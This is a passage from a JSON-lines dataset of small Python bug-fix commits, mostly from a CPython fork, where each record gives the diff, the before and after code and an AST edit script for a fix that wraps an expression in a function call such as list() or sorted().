{"project": "openobject-client-6.0", "commit_sha": "d8fd9dedac4c64d1e08bd020361166f5c49c689f", "parent_sha": "04cd87460ff3b1c679933ac857cb8fd7481d30e1", "file_path": "bin/widget_search/checkbox.py", "project_url": "https://github.com/hunslater/openobject-client-6.0", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -40,7 +40,7 @@ class checkbox(wid_int.wid_int):\n         self.entry.set_editable(False)\n         if self.default_search:\n             if self.default_search == 1:\n-                self.default_search = 'Yes'\n+                self.default_search = _('Yes')\n             self.widget.child.set_text(self.default_search.capitalize())\n \n", "before": "self . default_search = 'Yes'", "after": "self . default_search = _ ( 'Yes' )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"assignment\", 3, 17, 3, 44], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:_\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"string:'Yes'\", 3, 39, 3, 44], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "mnd", "commit_sha": "fa49412a791a7697864242197876e05a9a523350", "parent_sha": "84ec231cb5f8b0d7837840c0dccfc37a285bba21", "file_path": "mnd/match.py", "project_url": "https://github.com/stuaxo/mnd", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -58,7 +58,7 @@ def args_match(m_args, m_kwargs, *args, **kwargs):\n-    if len(m_args) > args:\n+    if len(m_args) > len(args):\n         return False\n     for m_arg, arg in zip(m_args, args):\n         if not arg_match(m_arg, arg):\n", "before": "if len ( m_args ) > args : return False", "after": "if len ( m_args ) > len ( args ) : return False", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"comparison_operator\", 0, 8, 0, 26], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:len\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:args\", 0, 22, 0, 26], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "Crowdfunding-Backend", "commit_sha": "c9a5b4a0469466b75eaf1630e7ee85037d50636b", "parent_sha": "396c6f0564d6250696b91061c52825e4c74461ed", "file_path": "poliedro_donate/views.py", "project_url": "https://github.com/poliedro-polimi/Crowdfunding-Backend", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -17,7 +17,7 @@ import paypalrestsdk.v1.payments as payments\n @app.errorhandler(KeyError)\n @app.errorhandler(ValueError)\n def handle_invalid_usage(error):\n-    response = jsonify({\"error\": str(error)})\n+    response = jsonify({\"error\": \"{}: {}\".format(error.__class__.__name__, str(error))})\n     response.status_code = 400\n     return response\n \n", "before": "response = jsonify ( { \"error\" : str ( error ) } )", "after": "response = jsonify ( { \"error\" : \"{}: {}\" . format ( error . __class__ . __name__ , str ( error ) ) } )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 34, 3, 44], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 34, 3, 44], [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N0\", [\"string:\\\"{}: {}\\\"\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:format\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Move\", \"N1\", [\"call\", 3, 34, 3, 44], 3], [\"Insert\", \"N1\", [\"):)\", \"T\"], 4], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:__name__\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:error\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:__class__\", \"T\"], 2]]"}
{"project": "dit", "commit_sha": "6622d9f50d5d5b09cf961ca56ab5e6cfca3f5519", "parent_sha": "4501a11516506a74d43a633b3bd3d5f7fe72fe4d", "file_path": "dit/abstractdist.py", "project_url": "https://github.com/mpeaton37/dit", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -340,7 +340,7 @@ def get_abstract_dist(dist):\n     else:\n         class D(object):\n             n_variables = dist.outcome_length()\n-            n_elements = np.prod(map(len, dist.alphabet))\n+            n_elements = np.prod(list(map(len, dist.alphabet)))\n             def parameter_array(self, indexes, cache=None):\n                 return brute_marginal_array(dist, indexes, rv_mode='indexes')\n         d = D()\n", "before": "n_elements = np . prod ( map ( len , dist . alphabet ) )", "after": "n_elements = np . prod ( list ( map ( len , dist . alphabet ) ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 34, 3, 57], [\"identifier:list\", \"T\"], 0], [\"Insert\", [\"call\", 3, 34, 3, 57], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 34, 3, 57], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "dit", "commit_sha": "06e8d5d39c9f0b2df77e5cc552fb2d7f7007d23b", "parent_sha": "698441dd5624f8875af83ec107c535254eacf1a8", "file_path": "dit/profiles/marginal_utility_of_information.py", "project_url": "https://github.com/mpeaton37/dit", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -146,7 +146,7 @@ class MUIProfile(BaseProfile):\n         mui = np.round(np.diff(maxui)/np.diff(pnts), 7)\n         vals = np.array(np.unique(mui, return_index=True))\n         self.profile = dict((pnts[int(row[1])], row[0]) for row in vals.T)\n-        self.widths = np.diff(list(self.profile.keys()) + [ent])\n+        self.widths = np.diff(list(sorted(self.profile.keys())) + [ent])\n \n     def draw(self, ax=None): # pragma: no cover\n         ax = super(MUIProfile, self).draw(ax=ax)\n", "before": "self . widths = np . diff ( list ( self . profile . keys ( ) ) + [ ent ] )", "after": "self . widths = np . diff ( list ( sorted ( self . profile . keys ( ) ) ) + [ ent ] )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 36, 3, 55], [\"identifier:sorted\", \"T\"], 0], [\"Insert\", [\"call\", 3, 36, 3, 55], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 36, 3, 55], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "4ec9ea40bd748b81d9f7a2fef22c91e79cc0f5d4", "parent_sha": "105a9d19ce0e979d054edc61eb8b0f6c4211339c", "file_path": "Lib/test/test_unicodedata.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -176,7 +176,7 @@ class UnicodeFunctionsTest(UnicodeDatabaseTest):\n \n     def test_east_asian_width(self):\n         eaw = self.db.east_asian_width\n-        self.assertRaises(TypeError, eaw, 'a')\n+        self.assertRaises(TypeError, eaw, str8('a'))\n         self.assertRaises(TypeError, eaw, '')\n         self.assertRaises(TypeError, eaw, 'ra')\n         self.assertEqual(eaw('\\x1e'), 'N')\n", "before": "self . assertRaises ( TypeError , eaw , 'a' )", "after": "self . assertRaises ( TypeError , eaw , str8 ( 'a' ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 26, 3, 47], [\"call\", \"N0\"], 5], [\"Insert\", [\"argument_list\", 3, 26, 3, 47], [\"):)\", \"T\"], 6], [\"Insert\", \"N0\", [\"identifier:str8\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"string:'a'\", 3, 43, 3, 46], 1], [\"Move\", \"N1\", [\"):)\", 3, 46, 3, 47], 2]]"}
{"project": "cpython", "commit_sha": "b6ba02b18dc6371e9f9dfe6ad322b2722138eca5", "parent_sha": "af3fa7bfe5640e76929ed1f545712e0c2d0d226e", "file_path": "Lib/test/test_complex.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -327,7 +327,7 @@ class ComplexTest(unittest.TestCase):\n             print(a, b, file=fo)\n             fo.close()\n             fo = open(test_support.TESTFN, \"rb\")\n-            self.assertEqual(fo.read(), \"%s %s\\n\" % (a, b))\n+            self.assertEqual(fo.read(), bytes(\"%s %s\\n\" % (a, b)))\n         finally:\n             if (fo is not None) and (not fo.closed):\n                 fo.close()\n", "before": "self . assertEqual ( fo . read ( ) , \"%s %s\\n\" % ( a , b ) )", "after": "self . assertEqual ( fo . read ( ) , bytes ( \"%s %s\\n\" % ( a , b ) ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 29, 3, 60], [\"call\", \"N0\"], 3], [\"Insert\", [\"argument_list\", 3, 29, 3, 60], [\"):)\", \"T\"], 4], [\"Insert\", \"N0\", [\"identifier:bytes\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"binary_operator\", 3, 41, 3, 59], 1], [\"Move\", \"N1\", [\"):)\", 3, 59, 3, 60], 2]]"}
{"project": "cpython", "commit_sha": "8fc137846124713c9376a7bb534e04d737a73eb9", "parent_sha": "77841481c87cae6bdf56a459634f6d077f8ce3ba", "file_path": "Lib/test/test_anydbm.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -35,7 +35,7 @@ class AnyDBMTestCase(unittest.TestCase):\n \n     def test_anydbm_creation(self):\n         f = anydbm.open(_fname, 'c')\n-        self.assertEqual(f.keys(), [])\n+        self.assertEqual(list(f.keys()), [])\n         for key in self._dict:\n             f[key] = self._dict[key]\n         self.read_helper(f)\n", "before": "self . assertEqual ( f . keys ( ) , [ ] )", "after": "self . assertEqual ( list ( f . keys ( ) ) , [ ] )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 26, 3, 34], [\"identifier:list\", \"T\"], 0], [\"Insert\", [\"call\", 3, 26, 3, 34], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 26, 3, 34], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "30829f373406f3708f4d44f6a504e68b16cc68d7", "parent_sha": "c5d71f04fb3ddaa5a52f4260e2fc75e038c92bbd", "file_path": "Lib/idlelib/CallTips.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -152,7 +152,7 @@ def get_arg_text(ob):\n             defaults = fob.__defaults__ or []\n             defaults = list(map(lambda name: \"=%s\" % repr(name), defaults))\n             defaults = [\"\"] * (len(real_args) - len(defaults)) + defaults\n-            items = map(lambda arg, dflt: arg + dflt, real_args, defaults)\n+            items = list(map(lambda arg, dflt: arg + dflt, real_args, defaults))\n             if fob.__code__.co_flags & 0x4:\n                 items.append(\"...\")\n             if fob.__code__.co_flags & 0x8:\n", "before": "items = map ( lambda arg , dflt : arg + dflt , real_args , defaults )", "after": "items = list ( map ( lambda arg , dflt : arg + dflt , real_args , defaults ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 21, 3, 75], [\"identifier:list\", \"T\"], 0], [\"Insert\", [\"call\", 3, 21, 3, 75], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 21, 3, 75], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "391d58930156e4423e342986fd14d984d0a1830b", "parent_sha": "d32fca3b63f9c44b9c5fc19464bfb0c7fcb21d31", "file_path": "Lib/idlelib/WidgetRedirector.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -40,7 +40,7 @@ class WidgetRedirector:\n                                              self.widget._w)\n \n     def close(self):\n-        for operation in self._operations:\n+        for operation in list(self._operations):\n             self.unregister(operation)\n         widget = self.widget; del self.widget\n         orig = self.orig; del self.orig\n", "before": "for operation in self . _operations : self . unregister ( operation )", "after": "for operation in list ( self . _operations ) : self . unregister ( operation )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"for_statement\", 3, 9, 4, 39], [\"call\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:list\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"attribute\", 3, 26, 3, 42], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "adf53760f8c3f5addfbc9b67b230e43fade377b6", "parent_sha": "64bf39d7297597554361d546006126bb2c84a627", "file_path": "Lib/test/test_marshal.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -167,7 +167,7 @@ class ContainerTestCase(unittest.TestCase):\n         os.unlink(test_support.TESTFN)\n \n     def test_list(self):\n-        lst = self.d.items()\n+        lst = list(self.d.items())\n         new = marshal.loads(marshal.dumps(lst))\n         self.assertEqual(lst, new)\n         marshal.dump(lst, open(test_support.TESTFN, \"wb\"))\n", "before": "lst = self . d . items ( )", "after": "lst = list ( self . d . items ( ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 15, 3, 29], [\"identifier:list\", \"T\"], 0], [\"Insert\", [\"call\", 3, 15, 3, 29], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 15, 3, 29], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "f8dd4aeba26b3b297e2bf4864dbe9bb7291d6586", "parent_sha": "c8e7c27dc7c2f7513fa7f7130941ef2083c92376", "file_path": "Lib/pickle.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -791,7 +791,7 @@ def whichmodule(func, funcname):\n     if func in classmap:\n         return classmap[func]\n \n-    for name, module in sys.modules.items():\n+    for name, module in list(sys.modules.items()):\n         if module is None:\n             continue # skip dummy package entries\n         if name != '__main__' and getattr(module, funcname, None) is func:\n", "before": "for name , module in sys . modules . items ( ) : if module is None : continue if name != '__main__' and getattr ( module , funcname , None ) is func : ", "after": "for name , module in list ( sys . modules . items ( ) ) : if module is None : continue if name != '__main__' and getattr ( module , funcname , None ) is func : ", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 25, 3, 44], [\"identifier:list\", \"T\"], 0], [\"Insert\", [\"call\", 3, 25, 3, 44], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 25, 3, 44], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "5b73fb84089ed668ba5a63ec81112e6ae50114d5", "parent_sha": "f8dd4aeba26b3b297e2bf4864dbe9bb7291d6586", "file_path": "Lib/token.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -108,7 +108,7 @@ def main():\n             name, val = match.group(1, 2)\n             val = int(val)\n             tokens[val] = name          # reverse so we can sort them...\n-    keys = tokens.keys()\n+    keys = list(tokens.keys())\n     keys.sort()\n     # load the output skeleton from the target:\n     try:\n", "before": "keys = tokens . keys ( )", "after": "keys = list ( tokens . keys ( ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 12, 3, 25], [\"identifier:list\", \"T\"], 0], [\"Insert\", [\"call\", 3, 12, 3, 25], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 25], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "9764eb6a26325ec098cf1df8afb687084bed8bb7", "parent_sha": "e247b67d3691a2198323dbd8dd71efd88f6d1de9", "file_path": "Lib/linecache.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -45,7 +45,7 @@ def checkcache(filename=None):\n \n     if filename is None:\n-        filenames = cache.keys()\n+        filenames = list(cache.keys())\n     else:\n         if filename in cache:\n             filenames = [filename]\n", "before": "filenames = cache . keys ( )", "after": "filenames = list ( cache . keys ( ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 2, 21, 2, 33], [\"identifier:list\", \"T\"], 0], [\"Insert\", [\"call\", 2, 21, 2, 33], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 2, 21, 2, 33], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "18ac92dcd2c91f46ad631bd70035e80b96709ee9", "parent_sha": "f95f1a49d40aa8a3ba04dfd12e8ebf2e47f4db5a", "file_path": "Lib/urllib2.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1295,7 +1295,7 @@ class FTPHandler(BaseHandler):\n             if retrlen is not None and retrlen >= 0:\n                 headers += \"Content-length: %d\\n\" % retrlen\n             headers = email.message_from_string(headers)\n-            sf = StringIO(headers)\n+            sf = StringIO(str(headers))\n             return addinfourl(fp, headers, req.get_full_url())\n         except ftplib.all_errors as msg:\n             raise URLError('ftp error: %s' % msg).with_traceback(sys.exc_info()[2])\n", "before": "sf = StringIO ( headers )", "after": "sf = StringIO ( str ( headers ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 26, 3, 35], [\"(:(\", \"T\"], 0], [\"Insert\", [\"argument_list\", 3, 26, 3, 35], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 26, 3, 35], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Move\", \"N0\", [\"argument_list\", 3, 26, 3, 35], 1]]"}
{"project": "cpython", "commit_sha": "cb36e33881a46d5c707c8526491f27fea7643c9e", "parent_sha": "6c06c224c07bc2ec488f2405ae133e21cc553374", "file_path": "Lib/platform.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -933,7 +933,7 @@ def _follow_symlinks(filepath):\n     filepath = _abspath(filepath)\n     while os.path.islink(filepath):\n         filepath = os.path.normpath(\n-            os.path.join(filepath,os.readlink(filepath)))\n+            os.path.join(os.path.dirname(filepath),os.readlink(filepath)))\n     return filepath\n \n def _syscmd_uname(option,default=''):\n", "before": "filepath = os . path . normpath ( os . path . join ( filepath , os . readlink ( filepath ) ) )", "after": "filepath = os . path . normpath ( os . path . join ( os . path . dirname ( filepath ) , os . readlink ( filepath ) ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 25, 3, 57], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:dirname\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Move\", \"N2\", [\"identifier:filepath\", 3, 26, 3, 34], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:os\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:path\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "a94abe5735867fafa41b95cce03ce1ce920d33ed", "parent_sha": "ffd40fa23f1151c4645c6c543901b18c64463347", "file_path": "Lib/platform.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -793,7 +793,7 @@ def _follow_symlinks(filepath):\n     filepath = _abspath(filepath)\n     while os.path.islink(filepath):\n         filepath = os.path.normpath(\n-            os.path.join(filepath,os.readlink(filepath)))\n+            os.path.join(os.path.dirname(filepath),os.readlink(filepath)))\n     return filepath\n \n def _syscmd_uname(option,default=''):\n", "before": "filepath = os . path . normpath ( os . path . join ( filepath , os . readlink ( filepath ) ) )", "after": "filepath = os . path . normpath ( os . path . join ( os . path . dirname ( filepath ) , os . readlink ( filepath ) ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 25, 3, 57], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:dirname\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Move\", \"N2\", [\"identifier:filepath\", 3, 26, 3, 34], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:os\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:path\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "9ff3745ed2f02f18bc7ff6ab4dffdb5f2a533889", "parent_sha": "03ffe5bcd452012a726082d1ed323ae9a3cd98b6", "file_path": "Lib/platform.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -909,7 +909,7 @@ def _follow_symlinks(filepath):\n     filepath = os.path.abspath(filepath)\n     while os.path.islink(filepath):\n         filepath = os.path.normpath(\n-            os.path.join(filepath,os.readlink(filepath)))\n+            os.path.join(os.path.dirname(filepath),os.readlink(filepath)))\n     return filepath\n \n def _syscmd_uname(option,default=''):\n", "before": "filepath = os . path . normpath ( os . path . join ( filepath , os . readlink ( filepath ) ) )", "after": "filepath = os . path . normpath ( os . path . join ( os . path . dirname ( filepath ) , os . readlink ( filepath ) ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 25, 3, 57], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:dirname\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Move\", \"N2\", [\"identifier:filepath\", 3, 26, 3, 34], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:os\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:path\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "c8ab87710334068276a0a1551f40423f328d01fe", "parent_sha": "261504955d043d969f238f07b2e40bc00fbfa27a", "file_path": "Lib/test/test_tarfile.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -345,7 +345,7 @@ class MiscReadTest(CommonReadTest):\n                 if sys.platform != \"win32\":\n                     # Win32 has no support for fine grained permissions.\n                     self.assertEqual(tarinfo.mode & 0o777, os.stat(path).st_mode & 0o777)\n-                self.assertEqual(tarinfo.mtime, os.path.getmtime(path))\n+                self.assertEqual(tarinfo.mtime, int(os.path.getmtime(path)))\n         finally:\n             tar.close()\n \n", "before": "self . assertEqual ( tarinfo . mtime , os . path . getmtime ( path ) )", "after": "self . assertEqual ( tarinfo . mtime , int ( os . path . getmtime ( path ) ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 49, 3, 71], [\"identifier:int\", \"T\"], 0], [\"Insert\", [\"call\", 3, 49, 3, 71], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 49, 3, 71], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "20150fe4de5dfe37ac44b55f232dcaeaeb2c7361", "parent_sha": "7ccf11799411ecd8b93db72878fc9c4f7e6e54ce", "file_path": "Lib/test/test_dbm_gnu.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -49,7 +49,7 @@ class TestGdbm(unittest.TestCase):\n         all = set(gdbm.open_flags)\n         # Test standard flags (presumably \"crwn\").\n         modes = all - set('fsu')\n-        for mode in modes:\n+        for mode in sorted(modes):  # put \"c\" mode first\n             self.g = gdbm.open(filename, mode)\n             self.g.close()\n \n", "before": "for mode in modes : self . g = gdbm . open ( filename , mode ) self . g . close ( )", "after": "for mode in sorted ( modes ) : self . g = gdbm . open ( filename , mode ) self . g . close ( )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"for_statement\", 3, 9, 5, 27], [\"call\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:sorted\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:modes\", 3, 21, 3, 26], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "33f6d90e0878b3dfdbf2dc767e71d12aef8915a3", "parent_sha": "9ba8f453df4f598c8a22d1f781d0434a2c80020f", "file_path": "Lib/test/test_dbm_gnu.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -53,7 +53,7 @@ class TestGdbm(unittest.TestCase):\n         all = set(gdbm.open_flags)\n         # Test standard flags (presumably \"crwn\").\n         modes = all - set('fsu')\n-        for mode in modes:\n+        for mode in sorted(modes):  # put \"c\" mode first\n             self.g = gdbm.open(filename, mode)\n             self.g.close()\n \n", "before": "for mode in modes : self . g = gdbm . open ( filename , mode ) self . g . close ( )", "after": "for mode in sorted ( modes ) : self . g = gdbm . open ( filename , mode ) self . g . close ( )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"for_statement\", 3, 9, 5, 27], [\"call\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:sorted\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:modes\", 3, 21, 3, 26], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "25a0c1937138860084ab922ce312b1753e878758", "parent_sha": "c9b887fde02ceb09d58dca0da881a0cfc373ea14", "file_path": "Lib/test/test_venv.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -20,7 +20,7 @@ class BaseTest(unittest.TestCase):\n     \"\"\"Base class for venv tests.\"\"\"\n \n     def setUp(self):\n-        self.env_dir = tempfile.mkdtemp()\n+        self.env_dir = os.path.realpath(tempfile.mkdtemp())\n         if os.name == 'nt':\n             self.bindir = 'Scripts'\n             self.pydocname = 'pydoc.py'\n", "before": "self . env_dir = tempfile . mkdtemp ( )", "after": "self . env_dir = os . path . realpath ( tempfile . mkdtemp ( ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 24, 3, 42], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 24, 3, 42], [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:realpath\", \"T\"], 